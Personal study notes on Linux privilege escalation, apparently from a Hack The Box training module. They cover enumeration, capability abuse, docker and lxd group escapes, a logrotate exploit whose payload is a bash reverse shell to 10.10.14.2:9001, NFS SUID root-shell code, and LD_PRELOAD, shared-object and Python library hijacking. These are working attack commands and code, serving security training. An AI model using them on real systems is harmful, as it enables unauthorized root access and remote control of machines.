# Linux Privilege Escalation

- once we are root of linux sys, we can access all the sensitive data.
- if linux is domain joined, we can gain the NTLM hash and begin enumerating and attacking AD.

![Untitled](.gitbook/assets/Linux%20Privilege%20Escalation%20590d05b435dd41758764005e70d8f8fd/Untitled.png)

# Information Gathering

# Environment Enumeration

- `cat /etc/os-release` → checking os versions and other info
- `echo $PATH` → checking PATH variable
- `env` → check our all environment variable
- `uname -a` → check kernel versions
- `cat /etc/shells` → checking what login shell exist on the machine
- `route` or `netstat -rn` → check routing table to see what other network are available via which interface
- `arp -a` → check arp table to see what other hosts the target has been communication with

# **Linux Services & Internals Enumeration + Credential Hunting**

- `cat /etc/hosts` → view hosts file
- `w` → view logged in users
- `history` → command history
- `ls -la /etc/cron.daily/` → checking cron files
- `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list` → view installed packages
- `sudo -V` checking sudo version
- `ls -l /bin /usr/bin/ /usr/sbin/` → checking binaries
- `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; **2**>/dev/null` → checking configuration files
- `find / -type f -name "*.sh" **2**>/dev/null | grep -v "src\|snap\|share"` → checking scripts
- `ps aux | grep root`

- `find / ! -path "*/proc/*" -iname "*config*" -type f **2**>/dev/null` → search configuration file
    
    here we are searching file by excluding path `proc` 
    
    and `iname` is used for case insensitive search
    

# Capabilities

Capabilities in Linux OS allows specific privileges to be granted to process, allowing them to perform specific actions that would otherwise be restricted.

`setcap` cmd is used to set capabilities.

| Capability | Description |
| --- | --- |
| cap_sys_admin | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
| cap_sys_chroot | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
| cap_sys_ptrace | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| cap_sys_nice | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
| cap_sys_time | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
| cap_sys_resource | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
| cap_sys_module | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
| cap_net_bind_service | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |

```bash
dollarboysushil@htb[/htb]**$** sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

| Capability Values | Description |
| --- | --- |
| = | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. |
| +ep | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. |
| +ei | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. |
| +p | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| Capability | Desciption |
| --- | --- |
| cap_setuid | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user. |
| cap_setgid | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group. |
| cap_sys_admin | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems. |
| cap_dac_override | Allows bypassing of file read, write, and execute permission checks. |

```
dollarboysushil@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

search for binary in 3 directories, `-exec` is used to run `getcap` command on each file, showing there capabilities.

- `dollarboysushil@htb[/htb]**$** /usr/bin/vim.basic /etc/passwd`

# Group based

# Docker

If we are member of docker group we can escalate our privilege to root.

The idea is, we are going to take `/` directory of host machine and mount it to our container. Once the directory is mounted, we will have root inside of our container and we can manipulate any files on this host file system through the container.

- `docker run -v /:/mnt -it alpine`
    
    mount `/` from hot machine to `/mnt` with `-it` interactive terminal. using `alpine` image
    

When victim doesnot have internet, it cannot pull the alpine image, so 

- `docker pull alpine` → pull alpine in attacker machine
- `docker save -o alpine.tar alpine` → save alpine image to tar file and transfer to victim
- `docker load -i /path/to/destination/alpine.tar` → load image from tar file

then we are done

- `docker image ls` → shows the images.

# **LXC / LXD**

Idea is the same as docker.

- First we will download `Alpine Image` in our machine and transfer it to victim
    
    A minimal Docker ***image*** based on ***Alpine*** Linux with a complete package index and only 5 MB in size!
    
- `lxd init` to initialize linux container daemon

unzip the `Alpine.zip`

- `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`→ import local image.
- `lxc image list` → to list out the images
- `lxc init alpine r00t -c security.privileged=true` → Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
here `alpine` is the name of the image and `r00t` is the name of the container we are going to spawn
- `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` → Mount the host file system.
    
    we are mounting entire file system `/` of the host to path `/mnt/root`
    
    `recursive=true` to get all the files and folders.
    
- `lxc start r00t` → starting the container. we can use `lxc list` to view the status
- `lxc exec r00t /bin/sh` → execute a command inside of our container

Now we are root on the container and container contains the whole file system of host.
we can edit the `/mnt/etc/shadow`to remove / change password of root, so that we can login as root in host. 

# Disk

user of disk group has full access within `/dev` such as `/dev/sda`

# **ADM**

Members of the adm group are able to read all logs stored in `/var/log`.

# **Service-based**

# **Cron Job**

![Untitled](.gitbook/assets/Linux%20Privilege%20Escalation%20590d05b435dd41758764005e70d8f8fd/Untitled%201.png)

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).
Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

- `dollarboysushil@htb[/htb]**$** ./pspy64 -pf -i 1000`

# **Logrotate**

`logrotate` takes care of archiving or disposing of old logs to hard disk from overflowing from large amount of log files.

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0
    

we can use this tool https://github.com/whotwagner/logrotten

```
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

- `logger@nix02:~**$** echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload` → creating payload

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

```
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create
```

- `logger@nix02:~**$** ./logrotten -p ./payload /tmp/tmp.log` → running the exploit

1. create payload => bash -i >& /dev/tcp/10.10.14.10/9001 0>&1
2. transfer logrotten.c file to the machine
3. run logrotten => ./logrotten -p ./payload /home/htb-student/backups/access.log
on different ssh do below cmd
4. trigger log rotate => echo test > /home/htb-student/backups/access.log

# **Weak NFS Privileges**

first set `no_root_squash` option on `/etc/exports` file in victim machine

this allows any file we upload to the mount directory be owned by the root directory.

which means we can create a malicious file, set suid permission and upload to the mount.
when running from the server, this file runs as user root

```
htb@NIX02:~$ cat shell.c#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

simple malicious c code to give us root shell.

`htb@NIX02:/tmp**$** gcc shell.c -o shell`

```
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

```
htb@NIX02:/tmp$  ls -latotal 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# iduid=0(root) gid=0(root) groups=0(root),4(adm),
```

# **Shared Libraries**

For this we need an account with `sudo` access to run some command

```bash
htb-student@NIX02:~$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl

```

here key thing to look is,  `env_keep+=LD_PRELOAD` and  `(root) NOPASSWD: /usr/bin/openssl`

we are going to execute our own library and preload that before we run anything else, we are going to make a malicious library and use it.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

`root.so` 

- `htb_student@NIX02:~**$** gcc -fPIC -shared -o root.so root.c -nostartfiles` → compile it, we should have root.so

then 

- `sudo LD_PRELOAD=/home/htb-student/root.so /usr/bin/openssl` → we are pre loading our malicious library and running the service which we have sudo access.
    
    full path should be provided
    

# **Shared Object Hijacking**

Some binaries and programs have custom libraries associated with them. we can use `ldd` to print the shared object required for a specific binary or shared object.

For suid binary payroll

```
htb-student@NIX02:~$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

```
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

here using ldd command we can see a non  standard library [`libshared.so`](http://libshared.so) listed as a dependency for payroll.

we can load shared libraries from custom locations.  We can inspect the path using `readelf` utility

```
htb-student@NIX02:~$ readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

From here we can see `RUNPATH` configuration. Libraries in this folder are given preference over other folders.

From above command we can see, loading of libraries from `/development` folder.

```
htb-student@NIX02:~$ ls -la /development/
total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

we can see, we have rwx permission on /development folder. we can exploit this misconfiguration by placing a malicious library in this /development folder 

which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

lets create a malicious shared object

```bash
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

- `gcc src.c -fPIC -shared -o /development/libshared.so`
    
    compile and save it to /development folder.
    

Now running the binary gives us root shell

```bash
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

# **Python Library Hijacking**

there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

# Wrong write permissions

idea is, if any suid python file imports library and we have write permission on that library, we can add simple malicious code (reverse shell in that library) to get shell us privileged user.

# **Library Path**

idea here is, python searches and imports modules in priority order, meaning paths with higher on the list are searched first and then moves to priority with lower on this list.

example.

```
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

this shows the order in which modules are searched and imported.

lets say, a suid python file uses psutil module.

```
htb-student@lpenix:~$ pip3 show psutil
...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

we can use the above cmd to see psutil is installed in the path `/usr/local/lib/python3.8/dist-packages`.

While importing, python searches in `/usr/lib/python38.zip` → `/usr/lib/python38` ……. and then goes to `/usr/local/lib/python3.8/dist-packages`

so, what we can do is, create a malicious `psutil.py` in the folder `/usr/lib/python3.8` (if we have write permission) so then when psutil is imported, our malicious file gets executed.

# **PYTHONPATH Environment Variable**

```
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python
```

If we have `SETENV` permission then we can set PYTHONPATH environment variable to somewhere we have write permission and put the respective file in that folder.

```
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

So, here we can put malicious `psutil.py` inside the /tmp file and set the env variable. 

# IMPORTANT

sometimes we donot have write permission to these library location, if the suid set python file are present in the directory where  we have write permission then we can create malicious python script in this directory (as the current directory **always** comes first) this malicious script gets executed first.